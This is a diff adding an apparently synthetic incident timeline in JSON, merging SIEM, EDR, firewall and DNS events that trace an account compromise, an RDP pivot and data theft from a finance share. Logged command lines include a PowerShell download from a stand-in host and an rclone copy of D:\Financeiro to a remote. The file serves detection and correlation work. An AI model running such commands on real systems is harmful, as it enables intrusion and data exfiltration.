+    "auth_requirement": "multiFactorAuthentication",
+    "signin_id": "2bf02add-0db8-4e24-816e-8a6fd4f4a4fb",
+    "user_original": "m.silva@acme.com.br",
+    "mitre_heuristica": [
+     "T1078.004"
+    ]
+   }
+  },
+  {
+   "idx": 28,
+   "ts_utc": "2026-11-10T13:30:00.000Z",
+   "source": "sentinel",
+   "event_type": "logon",
+   "raw_ref": "sentinel_securityevent.json#0",
+   "ts_original": "2026-11-10T13:30:00.000Z",
+   "host": "srv-file-01",
+   "user": "dc01$",
+   "src_ip": "10.10.0.10",
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "4624",
+   "outcome": "success",
+   "description": "logon: 4624 — dc01$",
+   "severity": null,
+   "mitre": [],
+   "extra": {
+    "event_id": 4624,
+    "logon_type": 3,
+    "workstation": "DC01",
+    "table": "SecurityEvent",
+    "user_original": "DC01$",
+    "mitre_heuristica": [],
+    "corroborado_por": [
+     "wazuh_alerts.json:1"
+    ]
+   }
+  },
+  {
+   "idx": 29,
+   "ts_utc": "2026-11-10T13:30:00.000Z",
+   "source": "splunk",
+   "event_type": "network",
+   "raw_ref": "splunk_export.csv:3",
+   "ts_original": "2026-11-10T10:30:00.000-03:00",
+   "host": null,
+   "user": null,
+   "src_ip": "10.10.20.41",
+   "dst_ip": "192.0.2.200",
+   "dst_port": 443,
+   "domain": null,
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "allowed",
+   "outcome": "success",
+   "description": "Conexão: 10.10.20.41 → 192.0.2.200",
+   "severity": null,
+   "mitre": [],
+   "extra": {
+    "sourcetype": "pan:traffic",
+    "observer": "pa-fw-01",
+    "bytes_out": 20311,
+    "bytes_in": 993120,
+    "app": "ms-office365-base",
+    "mitre_heuristica": []
+   }
+  },
+  {
+   "idx": 30,
+   "ts_utc": "2026-11-10T13:30:00.210Z",
+   "source": "wazuh",
+   "event_type": "logon",
+   "raw_ref": "wazuh_alerts.json:1",
+   "ts_original": "2026-11-10T10:30:00.210-0300",
+   "host": "srv-file-01",
+   "user": "dc01$",
+   "src_ip": "10.10.0.10",
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "4624",
+   "outcome": "success",
+   "description": "[Wazuh 60106] Windows Logon Success",
+   "severity": "informational",
+   "mitre": [],
+   "extra": {
+    "event_id": 4624,
+    "logon_type": 3,
+    "workstation": null,
+    "host_ip": "10.10.30.5",
+    "rule_id": "60106",
+    "rule_level": 3,
+    "rule_description": "Windows Logon Success",
+    "rule_groups": [
+     "windows",
+     "windows_security"
+    ],
+    "user_original": "DC01$",
+    "mitre_heuristica": [],
+    "corroborado_por": [
+     "sentinel_securityevent.json#0"
+    ]
+   }
+  },
+  {
+   "idx": 31,
+   "ts_utc": "2026-11-10T13:30:44.000Z",
+   "source": "entra_audit",
+   "event_type": "audit",
+   "raw_ref": "entra_audit.json#2",
+   "ts_original": "2026-11-10T13:30:44Z",
+   "host": null,
+   "user": "m.silva",
+   "src_ip": "198.51.100.77",
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "Consent to application",
+   "outcome": "success",
+   "description": "Consent to application por m.silva → MailSync Pro",
+   "severity": null,
+   "mitre": [
+    "T1528"
+   ],
+   "extra": {
+    "category": "ApplicationManagement",
+    "logged_by_service": "Core Directory",
+    "targets": [
+     "MailSync Pro"
+    ],
+    "details": {
+     "Permissions": "Mail.Read Mail.Send offline_access"
+    },
+    "modified_properties": [],
+    "user_original": "m.silva@acme.com.br",
+    "mitre_heuristica": [
+     "T1528"
+    ]
+   }
+  },
+  {
+   "idx": 32,
+   "ts_utc": "2026-11-10T13:39:50.000Z",
+   "source": "defender",
+   "event_type": "process",
+   "raw_ref": "defender_advanced_hunting.csv:18",
+   "ts_original": "2026-11-10T13:39:50.0000000Z",
+   "host": "ws-fin-023",
+   "user": "m.silva",
+   "src_ip": null,
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": "mstsc.exe",
+   "parent": "updater.exe",
+   "cmdline": "mstsc.exe /v:10.10.30.5",
+   "file_path": "C:\\Windows\\System32\\mstsc.exe",
+   "sha256": "c6e208ca805766dcf7f3eb1019b967cece5322a70b0fcd3a95f397784c90f8ef",
+   "action": "ProcessCreated",
+   "outcome": null,
+   "description": "mstsc.exe iniciado por updater.exe",
+   "severity": null,
+   "mitre": [
+    "T1021.001"
+   ],
+   "extra": {
+    "table": "DeviceProcessEvents",
+    "user_original": "m.silva",
+    "mitre_heuristica": [
+     "T1021.001"
+    ]
+   }
+  },
+  {
+   "idx": 33,
+   "ts_utc": "2026-11-10T13:39:58.000Z",
+   "source": "defender",
+   "event_type": "network",
+   "raw_ref": "defender_advanced_hunting.csv:19",
+   "ts_original": "2026-11-10T13:39:58.0000000Z",
+   "host": "ws-fin-023",
+   "user": "m.silva",
+   "src_ip": "10.10.20.23",
+   "dst_ip": "10.10.30.5",
+   "dst_port": 3389,
+   "domain": null,
+   "process": "mstsc.exe",
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "ConnectionSuccess",
+   "outcome": "success",
+   "description": "Conexão: 10.10.20.23 → 10.10.30.5",
+   "severity": null,
+   "mitre": [
+    "T1021.001"
+   ],
+   "extra": {
+    "table": "DeviceNetworkEvents",
+    "host_ip": "10.10.20.23",
+    "user_original": "m.silva",
+    "mitre_heuristica": [
+     "T1021.001"
+    ],
+    "dst_host": "srv-file-01"
+   }
+  },
+  {
+   "idx": 34,
+   "ts_utc": "2026-11-10T13:40:12.000Z",
+   "source": "sentinel",
+   "event_type": "logon",
+   "raw_ref": "sentinel_securityevent.json#1",
+   "ts_original": "2026-11-10T13:40:12.000Z",
+   "host": "srv-file-01",
+   "user": "svc_backup",
+   "src_ip": "10.10.20.23",
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "4624",
+   "outcome": "success",
+   "description": "logon: 4624 — svc_backup",
+   "severity": null,
+   "mitre": [
+    "T1021.001"
+   ],
+   "extra": {
+    "event_id": 4624,
+    "logon_type": 10,
+    "workstation": "WS-FIN-023",
+    "table": "SecurityEvent",
+    "user_original": "svc_backup",
+    "mitre_heuristica": [
+     "T1021.001"
+    ],
+    "src_host": "ws-fin-023"
+   }
+  },
+  {
+   "idx": 35,
+   "ts_utc": "2026-11-10T13:40:12.500Z",
+   "source": "sentinel",
+   "event_type": "logon",
+   "raw_ref": "sentinel_securityevent.json#2",
+   "ts_original": "2026-11-10T13:40:12.500Z",
+   "host": "srv-file-01",
+   "user": "svc_backup",
+   "src_ip": null,
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "4672",
+   "outcome": null,
+   "description": "privilégios especiais atribuídos",
+   "severity": null,
+   "mitre": [],
+   "extra": {
+    "event_id": 4672,
+    "logon_type": null,
+    "workstation": null,
+    "privileges": "SeBackupPrivilege SeRestorePrivilege SeDebugPrivilege",
+    "table": "SecurityEvent",
+    "user_original": "svc_backup",
+    "mitre_heuristica": []
+   }
+  },
+  {
+   "idx": 36,
+   "ts_utc": "2026-11-10T13:40:15.512Z",
+   "source": "wazuh",
+   "event_type": "logon",
+   "raw_ref": "wazuh_alerts.json:2",
+   "ts_original": "2026-11-10T10:40:15.512-0300",
+   "host": "srv-file-01",
+   "user": "svc_backup",
+   "src_ip": "10.10.20.23",
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "4624",
+   "outcome": "success",
+   "description": "[Wazuh 92653] User: ACME\\svc_backup logged using Remote Desktop Connection (RDP) from ip:10.10.20.23.",
+   "severity": "low",
+   "mitre": [
+    "T1021.001"
+   ],
+   "extra": {
+    "event_id": 4624,
+    "logon_type": 10,
+    "workstation": null,
+    "host_ip": "10.10.30.5",
+    "rule_id": "92653",
+    "rule_level": 6,
+    "rule_description": "User: ACME\\svc_backup logged using Remote Desktop Connection (RDP) from ip:10.10.20.23.",
+    "rule_groups": [
+     "windows",
+     "windows_security"
+    ],
+    "user_original": "svc_backup",
+    "mitre_heuristica": [
+     "T1021.001"
+    ],
+    "src_host": "ws-fin-023"
+   }
+  },
+  {
+   "idx": 37,
+   "ts_utc": "2026-11-10T13:41:30.000Z",
+   "source": "sentinel",
+   "event_type": "process",
+   "raw_ref": "sentinel_securityevent.json#3",
+   "ts_original": "2026-11-10T13:41:30.000Z",
+   "host": "srv-file-01",
+   "user": "svc_backup",
+   "src_ip": null,
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": "cmd.exe",
+   "parent": "explorer.exe",
+   "cmdline": "\"C:\\Windows\\System32\\cmd.exe\"",
+   "file_path": "C:\\Windows\\System32\\cmd.exe",
+   "sha256": null,
+   "action": "4688",
+   "outcome": null,
+   "description": "cmd.exe iniciado por explorer.exe",
+   "severity": null,
+   "mitre": [
+    "T1059.003"
+   ],
+   "extra": {
+    "event_id": 4688,
+    "table": "SecurityEvent",
+    "user_original": "svc_backup",
+    "mitre_heuristica": [
+     "T1059.003"
+    ]
+   }
+  },
+  {
+   "idx": 38,
+   "ts_utc": "2026-11-10T13:52:10.000Z",
+   "source": "sentinel",
+   "event_type": "process",
+   "raw_ref": "sentinel_securityevent.json#4",
+   "ts_original": "2026-11-10T13:52:10.000Z",
+   "host": "srv-file-01",
+   "user": "svc_backup",
+   "src_ip": null,
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": "powershell.exe",
+   "parent": "cmd.exe",
+   "cmdline": "powershell -c \"iwr https://cdn-update.example-cdn.net/r.zip -o C:\\ProgramData\\rc\\r.zip; Expand-Archive C:\\ProgramData\\rc\\r.zip C:\\ProgramData\\rc\"",
+   "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "sha256": null,
+   "action": "4688",
+   "outcome": null,
+   "description": "powershell.exe iniciado por cmd.exe",
+   "severity": null,
+   "mitre": [
+    "T1059.001",
+    "T1105"
+   ],
+   "extra": {
+    "event_id": 4688,
+    "table": "SecurityEvent",
+    "user_original": "svc_backup",
+    "mitre_heuristica": [
+     "T1059.001",
+     "T1105"
+    ]
+   }
+  },
+  {
+   "idx": 39,
+   "ts_utc": "2026-11-10T13:52:11.020Z",
+   "source": "elastic",
+   "event_type": "dns",
+   "raw_ref": "elastic_dns.ndjson:3",
+   "ts_original": "2026-11-10T13:52:11.020Z",
+   "host": null,
+   "user": null,
+   "src_ip": "10.10.30.5",
+   "dst_ip": "203.0.113.45",
+   "dst_port": null,
+   "domain": "cdn-update.example-cdn.net",
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": null,
+   "outcome": null,
+   "description": "Consulta DNS: 10.10.30.5 → cdn-update.example-cdn.net",
+   "severity": null,
+   "mitre": [],
+   "extra": {
+    "observer": "dc01",
+    "mitre_heuristica": [],
+    "src_host": "srv-file-01"
+   }
+  },
+  {
+   "idx": 40,
+   "ts_utc": "2026-11-10T13:52:12.900Z",
+   "source": "splunk",
+   "event_type": "network",
+   "raw_ref": "splunk_export.csv:4",
+   "ts_original": "2026-11-10T10:52:12.900-03:00",
+   "host": null,
+   "user": null,
+   "src_ip": "10.10.30.5",
+   "dst_ip": "203.0.113.45",
+   "dst_port": 443,
+   "domain": null,
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "allowed",
+   "outcome": "success",
+   "description": "Conexão: 10.10.30.5 → 203.0.113.45",
+   "severity": null,
+   "mitre": [],
+   "extra": {
+    "sourcetype": "pan:traffic",
+    "observer": "pa-fw-01",
+    "bytes_out": 3120,
+    "bytes_in": 21400000,
+    "app": "ssl",
+    "mitre_heuristica": [],
+    "src_host": "srv-file-01"
+   }
+  },
+  {
+   "idx": 41,
+   "ts_utc": "2026-11-10T13:57:40.000Z",
+   "source": "sentinel",
+   "event_type": "process",
+   "raw_ref": "sentinel_securityevent.json#5",
+   "ts_original": "2026-11-10T13:57:40.000Z",
+   "host": "srv-file-01",
+   "user": "svc_backup",
+   "src_ip": null,
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": "rclone.exe",
+   "parent": "cmd.exe",
+   "cmdline": "C:\\ProgramData\\rc\\rclone.exe copy D:\\Financeiro remote:bkp --transfers 8 --config C:\\ProgramData\\rc\\rclone.conf",
+   "file_path": "C:\\ProgramData\\rc\\rclone.exe",
+   "sha256": null,
+   "action": "4688",
+   "outcome": null,
+   "description": "rclone.exe iniciado por cmd.exe",
+   "severity": null,
+   "mitre": [
+    "T1567.002"
+   ],
+   "extra": {
+    "event_id": 4688,
+    "table": "SecurityEvent",
+    "user_original": "svc_backup",
+    "mitre_heuristica": [
+     "T1567.002"
+    ],
+    "corroborado_por": [
+     "splunk_export.csv:5",
+     "wazuh_alerts.json:3"
+    ]
+   }
+  },
+  {
+   "idx": 42,
+   "ts_utc": "2026-11-10T13:57:40.120Z",
+   "source": "splunk",
+   "event_type": "process",
+   "raw_ref": "splunk_export.csv:5",
+   "ts_original": "2026-11-10T10:57:40.120-03:00",
+   "host": "srv-file-01",
+   "user": "svc_backup",
+   "src_ip": null,
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": "rclone.exe",
+   "parent": "cmd.exe",
+   "cmdline": "C:\\ProgramData\\rc\\rclone.exe copy D:\\Financeiro remote:bkp --transfers 8 --config C:\\ProgramData\\rc\\rclone.conf",
+   "file_path": "C:\\ProgramData\\rc\\rclone.exe",
+   "sha256": "cc3f602c02b85a1d8e589ed90c51aa587adf921816b27164a996daaf09607712",
+   "action": "sysmon:1",
+   "outcome": null,
+   "description": "rclone.exe iniciado por cmd.exe",
+   "severity": null,
+   "mitre": [
+    "T1567.002"
+   ],
+   "extra": {
+    "event_id": 1,
+    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
+    "user_original": "ACME\\svc_backup",
+    "mitre_heuristica": [
+     "T1567.002"
+    ],
+    "corroborado_por": [
+     "sentinel_securityevent.json#5",
+     "wazuh_alerts.json:3"
+    ]
+   }
+  },
+  {
+   "idx": 43,
+   "ts_utc": "2026-11-10T13:57:41.000Z",
+   "source": "wazuh",
+   "event_type": "process",
+   "raw_ref": "wazuh_alerts.json:3",
+   "ts_original": "2026-11-10T10:57:41.000-0300",
+   "host": "srv-file-01",
+   "user": "svc_backup",
+   "src_ip": null,
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": "rclone.exe",
+   "parent": "cmd.exe",
+   "cmdline": "C:\\ProgramData\\rc\\rclone.exe copy D:\\Financeiro remote:bkp --transfers 8 --config C:\\ProgramData\\rc\\rclone.conf",
+   "file_path": "C:\\ProgramData\\rc\\rclone.exe",
+   "sha256": null,
+   "action": "sysmon:1",
+   "outcome": null,
+   "description": "[Wazuh 100200] Ferramenta de sincronização em nuvem (rclone) executada em servidor",
+   "severity": "high",
+   "mitre": [
+    "T1567.002"
+   ],
+   "extra": {
+    "event_id": 1,
+    "host_ip": "10.10.30.5",
+    "rule_id": "100200",
+    "rule_level": 12,
+    "rule_description": "Ferramenta de sincronização em nuvem (rclone) executada em servidor",
+    "rule_groups": [
+     "windows",
+     "windows_security"
+    ],
+    "user_original": "ACME\\svc_backup",
+    "mitre_heuristica": [
+     "T1567.002"
+    ],
+    "corroborado_por": [
+     "sentinel_securityevent.json#5",
+     "splunk_export.csv:5"
+    ]
+   }
+  },
+  {
+   "idx": 44,
+   "ts_utc": "2026-11-10T13:57:42.800Z",
+   "source": "elastic",
+   "event_type": "dns",
+   "raw_ref": "elastic_dns.ndjson:4",
+   "ts_original": "2026-11-10T13:57:42.800Z",
+   "host": null,
+   "user": null,
+   "src_ip": "10.10.30.5",
+   "dst_ip": "198.51.100.200",
+   "dst_port": null,
+   "domain": "bkp.example-storage.net",
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": null,
+   "outcome": null,
+   "description": "Consulta DNS: 10.10.30.5 → bkp.example-storage.net",
+   "severity": null,
+   "mitre": [],
+   "extra": {
+    "observer": "dc01",
+    "mitre_heuristica": [],
+    "src_host": "srv-file-01"
+   }
+  },
+  {
+   "idx": 45,
+   "ts_utc": "2026-11-10T13:57:43.004Z",
+   "source": "splunk",
+   "event_type": "network",
+   "raw_ref": "splunk_export.csv:6",
+   "ts_original": "2026-11-10T10:57:43.004-03:00",
+   "host": "srv-file-01",
+   "user": "svc_backup",
+   "src_ip": null,
+   "dst_ip": "198.51.100.200",
+   "dst_port": 443,
+   "domain": "bkp.example-storage.net",
+   "process": "rclone.exe",
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "sysmon:3",
+   "outcome": null,
+   "description": "Conexão: srv-file-01 → bkp.example-storage.net",
+   "severity": null,
+   "mitre": [
+    "T1567.002"
+   ],
+   "extra": {
+    "event_id": 3,
+    "host_ip": null,
+    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
+    "user_original": "ACME\\svc_backup",
+    "mitre_heuristica": [
+     "T1567.002"
+    ]
+   }
+  },
+  {
+   "idx": 46,
+   "ts_utc": "2026-11-10T14:14:58.000Z",
+   "source": "splunk",
+   "event_type": "network",
+   "raw_ref": "splunk_export.csv:7",
+   "ts_original": "2026-11-10T11:14:58.000-03:00",
+   "host": null,
+   "user": null,
+   "src_ip": "10.10.30.5",
+   "dst_ip": "198.51.100.200",
+   "dst_port": 443,
+   "domain": null,
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "allowed",
+   "outcome": "success",
+   "description": "Conexão: 10.10.30.5 → 198.51.100.200",
+   "severity": null,
+   "mitre": [],
+   "extra": {
+    "sourcetype": "pan:traffic",
+    "observer": "pa-fw-01",
+    "bytes_out": 1288490188,
+    "bytes_in": 5521200,
+    "app": "ssl",
+    "mitre_heuristica": [],
+    "src_host": "srv-file-01",
+    "volume_alto": true
+   }
+  },
+  {
+   "idx": 47,
+   "ts_utc": "2026-11-10T14:31:05.000Z",
+   "source": "sentinel",
+   "event_type": "audit",
+   "raw_ref": "sentinel_securityevent.json#6",
+   "ts_original": "2026-11-10T14:31:05.000Z",
+   "host": "srv-file-01",
+   "user": "svc_backup",
+   "src_ip": null,
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "1102",
+   "outcome": null,
+   "description": "log de auditoria limpo",
+   "severity": null,
+   "mitre": [
+    "T1070.001"
+   ],
+   "extra": {
+    "event_id": 1102,
+    "table": "SecurityEvent",
+    "user_original": "svc_backup",
+    "mitre_heuristica": [
+     "T1070.001"
+    ],
+    "corroborado_por": [
+     "wazuh_alerts.json:4"
+    ]
+   }
+  },
+  {
+   "idx": 48,
+   "ts_utc": "2026-11-10T14:31:05.400Z",
+   "source": "wazuh",
+   "event_type": "audit",
+   "raw_ref": "wazuh_alerts.json:4",
+   "ts_original": "2026-11-10T11:31:05.400-0300",
+   "host": "srv-file-01",
+   "user": "svc_backup",
+   "src_ip": null,
+   "dst_ip": null,
+   "dst_port": null,
+   "domain": null,
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "1102",
+   "outcome": null,
+   "description": "[Wazuh 63103] The audit log was cleared.",
+   "severity": "medium",
+   "mitre": [
+    "T1070.001"
+   ],
+   "extra": {
+    "event_id": 1102,
+    "host_ip": "10.10.30.5",
+    "rule_id": "63103",
+    "rule_level": 10,
+    "rule_description": "The audit log was cleared.",
+    "rule_groups": [
+     "windows",
+     "windows_security"
+    ],
+    "user_original": "svc_backup",
+    "mitre_heuristica": [
+     "T1070.001"
+    ],
+    "corroborado_por": [
+     "sentinel_securityevent.json#6"
+    ]
+   }
+  },
+  {
+   "idx": 49,
+   "ts_utc": "2026-11-10T14:31:10.000Z",
+   "source": "splunk",
+   "event_type": "network",
+   "raw_ref": "splunk_export.csv:8",
+   "ts_original": "2026-11-10T11:31:10.000-03:00",
+   "host": null,
+   "user": null,
+   "src_ip": "10.10.30.5",
+   "dst_ip": "198.51.100.200",
+   "dst_port": 443,
+   "domain": null,
+   "process": null,
+   "parent": null,
+   "cmdline": null,
+   "file_path": null,
+   "sha256": null,
+   "action": "allowed",
+   "outcome": "success",
+   "description": "Conexão: 10.10.30.5 → 198.51.100.200",
+   "severity": null,
+   "mitre": [],
+   "extra": {
+    "sourcetype": "pan:traffic",
+    "observer": "pa-fw-01",
+    "bytes_out": 1181116006,
+    "bytes_in": 4810022,
+    "app": "ssl",
+    "mitre_heuristica": [],
+    "src_host": "srv-file-01",
+    "volume_alto": true
+   }
+  }
+ ]
+}
